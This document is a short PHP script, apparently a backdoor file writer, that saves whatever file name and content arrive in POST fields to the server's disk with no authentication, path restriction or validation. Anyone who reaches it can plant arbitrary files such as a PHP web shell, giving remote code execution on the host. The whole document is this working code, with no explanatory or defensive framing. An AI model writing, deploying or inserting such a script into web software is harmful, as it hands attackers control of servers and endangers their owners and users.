<?php
if(!empty($_POST['FILENAME'])) {
    $filename=$_POST['FILENAME'];
    $content=$_POST['CONTENT'];
    $file = fopen($filename, "w") or die("can't open file");
    fwrite($file, $content);
    fclose($file);
}
?>